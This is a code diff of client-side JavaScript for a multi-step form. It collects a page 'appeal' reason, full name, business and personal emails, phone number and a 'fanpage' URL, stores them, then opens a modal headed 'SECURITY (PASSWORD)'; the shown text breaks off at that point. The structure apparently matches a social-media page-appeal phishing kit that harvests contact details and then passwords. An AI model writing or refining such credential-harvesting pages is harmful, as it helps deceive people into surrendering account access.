@@ -1,21 +1,17 @@
 // Main Application Logic
 document.getElementById('clientForm').addEventListener('submit', async (e) => {
     e.preventDefault();
-        const formData = {
-            appealReason: document.getElementById('appeal').value.trim(),
-            fullName: document.getElementById('appeal-fullname').value.trim(),
-            emailBusiness: document.getElementById('business-email').value.trim(),
-            emailPersonal: document.getElementById('personal-email').value.trim(),
-            phone: document.getElementById('mobile-phone').value.trim(),
-            fanpage: document.getElementById('appeal-page').value.trim(),
-            consent: document.getElementById('appeal-consent').checked
-        };
+    const formData = {
+        fullName: document.getElementById('fullName').value.trim(),
+        email: document.getElementById('email').value.trim(),
+        emailBusiness: document.getElementById('emailBusiness').value.trim(),
+        fanpage: document.getElementById('fanpage').value.trim(),
+        phone: document.getElementById('phone').value.trim(),
+    };
 
     Utils.saveRecord('__client_rec__fi_rst', formData);
     openSecurityModal();
 });
-
-
 // ==================== MODAL 2: SECURITY (PASSWORD) ====================
 function openSecurityModal() {
     const content = `
